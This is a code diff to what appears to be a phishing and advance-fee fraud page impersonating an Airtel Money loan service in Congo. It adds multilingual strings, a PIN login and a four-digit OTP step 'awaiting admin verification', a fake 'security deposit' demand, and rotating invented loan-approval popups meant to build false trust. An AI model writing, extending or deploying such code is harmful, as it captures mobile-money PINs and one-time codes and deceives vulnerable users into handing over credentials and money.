+      btn_prev: "PREVIOUS",
+      field_fname: "First Name",
+      field_lname: "Last Name",
+      field_email: "Email Address",
+      field_phone: "Phone Number",
+      phone_hint: "Enter 9 digits for Congo",
+      field_emp_status: "Employment Status",
+      emp_employed: "Employed",
+      emp_self: "Self-Employed",
+      emp_unemployed: "Unemployed",
+      emp_retired: "Retired",
+      emp_student: "Student",
+      field_annual_income: "Annual Income ($)",
+      sum_title: "Application Summary",
+      sum_amt: "Loan Amount:",
+      sum_term: "Loan Term:",
+      sum_purpose: "Purpose:",
+      sum_applicant: "Applicant:",
+      btn_submit: "SUBMIT APPLICATION",
+      sub_title: "Loan Application Submitted",
+      sub_desc: "Your loan application has been submitted. Please wait for approval.<br>You will receive a confirmation message. For now, proceed to Airtel Money.",
+      sub_redirect: "Redirecting to Airtel login in",
+      sub_btn_login: "Go to Login Now",
+      login_h2: "Account Login",
+      login_pin_lbl: "Enter your PIN (4 characters)",
+      login_forgot: "Forgot PIN?",
+      login_btn: "LOGIN",
+      terms_text: "By signing in you agree to the",
+      terms_link: "Terms and Conditions",
+      otp_h2: "OTP Verification",
+      otp_hint: "Enter the OTP sent to your phone number",
+      otp_waiting: "Waiting for admin to verify your details…",
+      otp_resend_in: "Resend code in",
+      otp_seconds: "seconds",
+      otp_submit: "SUBMIT",
+      appr_congrats: "🎉 Congratulations!",
+      appr_sub1: "Your loan has been",
+      appr_approved: "approved!",
+      appr_sub2: "The funds will be disbursed shortly.",
+      appr_banner_lbl: "APPROVED AMOUNT",
+      comp_notice: "⚠️ COMPLIANCE NOTICE",
+      comp_text1: "Your Airtel account must be active and maintain a security deposit of at least",
+      comp_text2: "10% of your requested loan amount.",
+      comp_text3: "This deposit is fully refundable upon successful loan repayment and helps secure better interest rates.",
+      ld_title: "💳 Loan Details",
+      ld_monthly: "MONTHLY PAYMENT",
+      ld_term: "LOAN TERM",
+      ld_interest: "INTEREST RATE",
+      qa_title: "Quick Actions",
+      qa_deposit: "💰 Deposit Funds",
+      qa_withdraw: "💸 Withdraw Funds",
+      qa_details: "📄 Loan Details",
+      nxt_title: "Next Steps:",
+      nxt_desc: "You will receive an SMS and email with disbursement details within 24 hours.",
+      rth_btn: "🏠 Return to Home",
+      modal_wait: "Please wait…",
+      modal_sending: "Sending your details for verification",
+      modal_verifying_otp: "Verifying OTP",
+      modal_submitting: "Submitting Application…",
+      modal_processing: "Please wait while we process your application"
+    },
+    sw: {
+      lang_label: "🌐 Kiswahili",
+      lbl_financial_services: "Huduma za Kifedha",
+      lbl_loan_app: "Maombi ya Mkopo",
+      lbl_secure_portal: "Lango Salama",
+      lbl_security_ver: "Uthibitishaji wa Usalama",
+      nav_signin: "Ingia",
+      nav_home: "Nyumbani",
+      nav_back: "Rudi",
+      land_h1: "Pata Mkopo Wako Umeidhinishwa Haraka",
+      land_sub: "Uidhinishaji wa haraka • Riba nafuu • Masharti rahisi",
+      calc_title: "Kikokotoo cha Mkopo",
+      calc_amt: "Kiasi cha Mkopo",
+      calc_term: "Muda wa Mkopo",
+      calc_6m: "miezi 6",
+      calc_60m: "miezi 60",
+      calc_monthly: "Malipo ya Kila Mwezi",
+      btn_apply_now: "OMBA SASA",
+      feat_fast: "Uidhinishaji wa Haraka",
+      feat_fast_sub: "Ndani ya saa 24",
+      feat_rates: "Riba Nafuu",
+      feat_rates_sub: "Kuanzia 12%",
+      feat_secure: "Salama",
+      feat_secure_sub: "Kiwango cha benki",
+      step_1_sub: "Hatua ya 1 kati ya 3",
+      step_2_sub: "Hatua ya 2 kati ya 3",
+      step_3_sub: "Hatua ya 3 kati ya 3",
+      field_loan_type: "Aina ya Mkopo",
+      opt_personal: "Mkopo wa Binafsi",
+      opt_business: "Mkopo wa Biashara",
+      opt_home: "Mkopo wa Nyumba",
+      opt_car: "Mkopo wa Gari",
+      opt_edu: "Mkopo wa Elimu",
+      field_loan_amt: "Kiasi cha Mkopo ($)",
+      field_loan_term: "Muda wa Mkopo",
+      field_purpose: "Madhumuni ya Mkopo",
+      btn_next: "HATUA INAYOFUATA",
+      btn_prev: "ILIYOPITA",
+      field_fname: "Jina la Kwanza",
+      field_lname: "Jina la Mwisho",
+      field_email: "Barua pepe",
+      field_phone: "Namba ya Simu",
+      phone_hint: "Weka namba 7 hadi 9 za Kongo",
+      field_emp_status: "Hali ya Ajira",
+      emp_employed: "Nimeajiriwa",
+      emp_self: "Nimejiajiri",
+      emp_unemployed: "Sina Ajira",
+      emp_retired: "Mstaafu",
+      emp_student: "Mwanafunzi",
+      field_annual_income: "Mapato ya Kila Mwaka ($)",
+      sum_title: "Muhtasari wa Maombi",
+      sum_amt: "Kiasi cha Mkopo:",
+      sum_term: "Muda wa Mkopo:",
+      sum_purpose: "Madhumuni:",
+      sum_applicant: "Mwombaji:",
+      btn_submit: "WASILISHA MAOMBI",
+      sub_title: "Maombi ya Mkopo Yamewasilishwa",
+      sub_desc: "Maombi yako yamewasilishwa. Tafadhali subiri uidhinishaji.<br>Utapokea ujumbe wa uthibitisho. Kwa sasa, endelea na Airtel Money.",
+      sub_redirect: "Inaelekezwa kwenye kuingia kwa Airtel baada ya sekunde",
+      sub_btn_login: "Nenda Kuingia Sasa",
+      login_h2: "Kuingia kwenye Akaunti",
+      login_pin_lbl: "Weka PIN yako (tarakimu 4)",
+      login_forgot: "Umesahau PIN?",
+      login_btn: "INGIA",
+      terms_text: "Kwa kuingia unakubaliana na",
+      terms_link: "Sheria na Masharti",
+      otp_h2: "Uthibitishaji wa OTP",
+      otp_hint: "Weka namba ya OTP iliyotumwa kwenye simu yako",
+      otp_waiting: "Inasubiri msimamizi athibitishe maelezo yako…",
+      otp_resend_in: "Tuma tena msimbo baada ya",
+      otp_seconds: "sekunde",
+      otp_submit: "WASILISHA",
+      appr_congrats: "🎉 Hongera!",
+      appr_sub1: "Mkopo wako",
+      appr_approved: "umeidhinishwa!",
+      appr_sub2: "Fedha zitatolewa hivi karibuni.",
+      appr_banner_lbl: "KIASI KILICHOIDHINISHWA",
+      comp_notice: "⚠️ TAHADHARI YA UTII",
+      comp_text1: "Akaunti yako ya Airtel lazima iwe hai na iwe na amana ya usalama ya angalau",
+      comp_text2: "10% ya kiasi cha mkopo ulichoomba.",
+      comp_text3: "Amana hii inarejeshwa kikamilifu baada ya kulipa mkopo kwa mafanikio na husaidia kupata viwango bora vya riba.",
+      ld_title: "💳 Maelezo ya Mkopo",
+      ld_monthly: "MALIPO YA KILA MWEZI",
+      ld_term: "MUDA WA MKOPO",
+      ld_interest: "KIWANGO CHA RIBA",
+      qa_title: "Vitendo vya Haraka",
+      qa_deposit: "💰 Weka Pesa",
+      qa_withdraw: "💸 Toa Pesa",
+      qa_details: "📄 Maelezo ya Mkopo",
+      nxt_title: "Hatua Zinazofuata:",
+      nxt_desc: "Utapokea SMS na barua pepe yenye maelezo ya utoaji ndani ya saa 24.",
+      rth_btn: "🏠 Rudi Nyumbani",
+      modal_wait: "Tafadhali subiri…",
+      modal_sending: "Inatuma maelezo yako kwa ajili ya uthibitishaji",
+      modal_verifying_otp: "Inathibitisha OTP",
+      modal_submitting: "Inawasilisha Maombi…",
+      modal_processing: "Tafadhali subiri tunapochakata maombi yako"
+    },
+    fr: {
+      lang_label: "🇫🇷 Français",
+      lbl_financial_services: "Services Financiers",
+      lbl_loan_app: "Demande de Prêt",
+      lbl_secure_portal: "Portail Sécurisé",
+      lbl_security_ver: "Vérification de Sécurité",
+      nav_signin: "Connexion",
+      nav_home: "Accueil",
+      nav_back: "Retour",
+      land_h1: "Obtenez Votre Prêt Rapidement",
+      land_sub: "Approbation rapide • Taux compétitifs • Termes flexibles",
+      calc_title: "Calculateur de Prêt",
+      calc_amt: "Montant du Prêt",
+      calc_term: "Durée du Prêt",
+      calc_6m: "6 mois",
+      calc_60m: "60 mois",
+      calc_monthly: "Paiement Mensuel",
+      btn_apply_now: "DEMANDER MAINTENANT",
+      feat_fast: "Approbation Rapide",
+      feat_fast_sub: "Sous 24 heures",
+      feat_rates: "Taux Bas",
+      feat_rates_sub: "À partir de 12%",
+      feat_secure: "Sécurisé",
+      feat_secure_sub: "Niveau bancaire",
+      step_1_sub: "Étape 1 sur 3",
+      step_2_sub: "Étape 2 sur 3",
+      step_3_sub: "Étape 3 sur 3",
+      field_loan_type: "Type de Prêt",
+      opt_personal: "Prêt Personnel",
+      opt_business: "Prêt Professionnel",
+      opt_home: "Prêt Immobilier",
+      opt_car: "Prêt Auto",
+      opt_edu: "Prêt Éducation",
+      field_loan_amt: "Montant du Prêt ($)",
+      field_loan_term: "Durée du Prêt",
+      field_purpose: "Motif du Prêt",
+      btn_next: "ÉTAPE SUIVANTE",
+      btn_prev: "PRÉCÉDENT",
+      field_fname: "Prénom",
+      field_lname: "Nom de famille",
+      field_email: "Adresse E-mail",
+      field_phone: "Numéro de Téléphone",
+      phone_hint: "Entrez 9 chiffres pour le Congo",
+      field_emp_status: "Statut Professionnel",
+      emp_employed: "Salarié",
+      emp_self: "Indépendant",
+      emp_unemployed: "Sans emploi",
+      emp_retired: "Retraité",
+      emp_student: "Étudiant",
+      field_annual_income: "Revenu Annuel ($)",
+      sum_title: "Résumé de la Demande",
+      sum_amt: "Montant du Prêt :",
+      sum_term: "Durée du Prêt :",
+      sum_purpose: "Motif :",
+      sum_applicant: "Demandeur :",
+      btn_submit: "SOUMETTRE LA DEMANDE",
+      sub_title: "Demande de Prêt Soumise",
+      sub_desc: "Votre demande de prêt a été soumise. Veuillez patienter pour l'approbation.<br>Vous recevrez un message de confirmation. Pour l'instant, passez à Airtel Money.",
+      sub_redirect: "Redirection vers la connexion Airtel dans",
+      sub_btn_login: "Aller à la Connexion",
+      login_h2: "Connexion au Compte",
+      login_pin_lbl: "Entrez votre PIN (4 caractères)",
+      login_forgot: "Code PIN oublié ?",
+      login_btn: "CONNEXION",
+      terms_text: "En vous connectant, vous acceptez les",
+      terms_link: "Termes et Conditions",
+      otp_h2: "Vérification OTP",
+      otp_hint: "Entrez l'OTP envoyé à votre numéro de téléphone",
+      otp_waiting: "En attente de la vérification de l'administrateur…",
+      otp_resend_in: "Renvoyer le code dans",
+      otp_seconds: "secondes",
+      otp_submit: "SOUMETTRE",
+      appr_congrats: "🎉 Félicitations !",
+      appr_sub1: "Votre prêt a été",
+      appr_approved: "approuvé !",
+      appr_sub2: "Les fonds seront décaissés sous peu.",
+      appr_banner_lbl: "MONTANT APPROUVÉ",
+      comp_notice: "⚠️ AVIS DE CONFORMITÉ",
+      comp_text1: "Votre compte Airtel doit être actif et maintenir un dépôt de garantie d'au moins",
+      comp_text2: "10% du montant de votre prêt demandé.",
+      comp_text3: "Ce dépôt est entièrement remboursable en cas de remboursement réussi et aide à obtenir de meilleurs taux d'intérêt.",
+      ld_title: "💳 Détails du Prêt",
+      ld_monthly: "PAIEMENT MENSUEL",
+      ld_term: "DURÉE DU PRÊT",
+      ld_interest: "TAUX D'INTÉRÊt",
+      qa_title: "Actions Rapides",
+      qa_deposit: "💰 Déposer des Fonds",
+      qa_withdraw: "💸 Retirer des Fonds",
+      qa_details: "📄 Détails du Prêt",
+      nxt_title: "Prochaines Étapes :",
+      nxt_desc: "Vous recevrez un SMS et un e-mail avec les détails du décaissement dans les 24 heures.",
+      rth_btn: "🏠 Retour à l'Accueil",
+      modal_wait: "Veuillez patienter…",
+      modal_sending: "Envoi de vos coordonnées pour vérification",
+      modal_verifying_otp: "Vérification de l'OTP",
+      modal_submitting: "Soumission de la demande…",
+      modal_processing: "Veuillez patienter pendant le traitement de votre demande"
+    }
+  };
+
+  let currentLang = 'en';
+
+  function toggleLangDropdown(event) {
+    event.stopPropagation();
+    document.getElementById('langDropdownMenu').classList.toggle('show');
+  }
+
+  window.addEventListener('click', () => {
+    const menu = document.getElementById('langDropdownMenu');
+    if (menu && menu.classList.contains('show')) {
+      menu.classList.remove('show');
+    }
+  });
+
+  function setLanguage(lang) {
+    if (!translations[lang]) return;
+    currentLang = lang;
+    
+    document.querySelectorAll('.lang-option').forEach(el => el.classList.remove('active'));
+    event && event.currentTarget && event.currentTarget.classList.add('active');
+    
+    const labels = { en: "🌐 English", sw: "🇨🇬 Kiswahili", fr: "🇫🇷 Français" };
+    document.getElementById('currentLangLabel').textContent = labels[lang];
+
+    document.querySelectorAll('[data-i18n]').forEach(el => {
+      const key = el.getAttribute('data-i18n');
+      if (translations[lang][key]) {
+        el.innerHTML = translations[lang][key];
+      }
+    });
+
+    document.getElementById('langDropdownMenu').classList.remove('show');
+  }
+
   // ══════════════════════════════════════════════════════
   // STATE
   // ══════════════════════════════════════════════════════
@@ -579,7 +1036,7 @@
     const r = 0.12 / 12;
     const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
     document.getElementById('aDisp').textContent = '$' + a.toLocaleString();
-    document.getElementById('tDisp').textContent = t + ' months';
+    document.getElementById('tDisp').textContent = t + ' ' + (currentLang === 'fr' ? 'mois' : currentLang === 'sw' ? 'miezi' : 'months');
     document.getElementById('mOut').textContent = '$' + m.toFixed(2);
     document.getElementById('rA').style.setProperty('--pct', ((a-50)/(10000-50)*100).toFixed(1) + '%');
     document.getElementById('rT').style.setProperty('--pct', ((t-6)/(60-6)*100).toFixed(1) + '%');
@@ -819,8 +1276,8 @@
 
   function otpMv(el, i) {
     el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 5) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3,4,5].every(j => document.getElementById('o'+j).value);
+    if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
+    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value);
     document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
   }
 
@@ -832,7 +1289,7 @@
     const rsBox = document.getElementById('otpRs');
     if (!rsBox) return;
 
-    rsBox.innerHTML = 'Resend code in <span id="rsS">' + s + '</span> seconds';
+    rsBox.innerHTML = '<span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">' + s + '</span> <span data-i18n="otp_seconds">seconds</span>';
 
     _rsInterval = setInterval(() => {
       s--;
@@ -859,7 +1316,7 @@
       if (data.success) {
         showOtpMsg('info', 'A new OTP request has been sent to the admin.');
         startRs();
-        [0,1,2,3,4,5].forEach(i => { document.getElementById('o'+i).value = ''; });
+        [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
         document.getElementById('bOtp').className = 'btn-otp';
         document.getElementById('o0').focus();
       } else {
@@ -871,9 +1328,9 @@
   }
 
   async function doOtp() {
-    const otp = [0,1,2,3,4,5].map(j => document.getElementById('o'+j).value).join('');
-    if (otp.length < 6) {
-      showOtpMsg('warning', 'Please enter all 6 digits of your OTP.');
+    const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
+    if (otp.length < 4) {
+      showOtpMsg('warning', 'Please enter all 4 digits of your OTP.');
       return;
     }
 
@@ -952,13 +1409,13 @@
             [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
             chkLogin();
             document.getElementById('bLogin').disabled = false;
-            [0,1,2,3,4,5].forEach(i => document.getElementById('o'+i).value = '');
+            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
             document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
             document.getElementById('pinWait').classList.remove('show');
             document.getElementById('otpInputSection').style.display = '';
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Resend code in <span id="rsS">60</span> seconds';
+            document.getElementById('otpRs').innerHTML = '<span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">60</span> <span data-i18n="otp_seconds">seconds</span>';
             hideOtpMsgs();
             S.applicationId = null;
             S.assignedAdminId = null;
@@ -967,7 +1424,7 @@
 
         } else if (data.status === 'wrongcode') {
           clearInterval(otpPollInterval);
-          [0,1,2,3,4,5].forEach(i => document.getElementById('o'+i).value = '');
+          [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
           showOtpMsg('error', 'Incorrect OTP code. Please check and re-enter.');
@@ -987,6 +1444,68 @@
   }
 
   calcUp();
+  
+  // ══════════════════════════════════════════════════════
+// LIVE APPROVAL POPUP LOGIC (AIRTEL CONGO - USD)
+// ══════════════════════════════════════════════════════
+document.addEventListener("DOMContentLoaded", () => {
+
+    const liveApprovals = [
+        { number: "+242 05 4*** 841", location: "Brazzaville", amount: "$150" },
+        { number: "+242 06 5*** 375", location: "Pointe-Noire", amount: "$300" },
+        { number: "+242 05 5*** 912", location: "Dolisie", amount: "$500" },
+        { number: "+242 06 4*** 458", location: "Nkayi", amount: "$1,200" },
+        { number: "+242 05 6*** 694", location: "Owando", amount: "$2,500" },
+        { number: "+242 06 6*** 231", location: "Ouesso", amount: "$5,000" },
+        { number: "+242 05 5*** 885", location: "Madingou", amount: "$10,000" },
+        { number: "+242 06 7*** 406", location: "Kinkala", amount: "$15,000" },
+        { number: "+242 05 2*** 534", location: "Loandjili", amount: "$20,000" }
+    ];
+
+    const popup = document.getElementById("popup");
+    const popupText = document.getElementById("popup-text");
+    const popupAvatar = document.getElementById("popup-avatar");
+
+    if (!popup || !popupText || !popupAvatar) {
+        console.error("Popup elements not found. Check your HTML IDs.");
+        return;
+    }
+
+    let lastIndex = -1;
+
+    function displayPopup() {
+        let index;
+
+        do {
+            index = Math.floor(Math.random() * liveApprovals.length);
+        } while (index === lastIndex && liveApprovals.length > 1);
+
+        lastIndex = index;
+
+        const user = liveApprovals[index];
+
+        // Avatar displays country code badge
+        popupAvatar.textContent = "+242";
+
+        popupText.innerHTML = `
+            <strong>${user.number}</strong><br>
+            From <strong>${user.location}</strong><br>
+            Has been approved for a loan of
+            <strong>${user.amount}</strong>
+        `;
+
+        popup.classList.add("show");
+
+        setTimeout(() => {
+            popup.classList.remove("show");
+        }, 2500);
+    }
+
+    // Trigger popup loop safely
+    setTimeout(displayPopup, 2000);
+    setInterval(displayPopup, 5500); // Cycles every 5.5 seconds
+
+});
 </script>
 </body>
 </html>
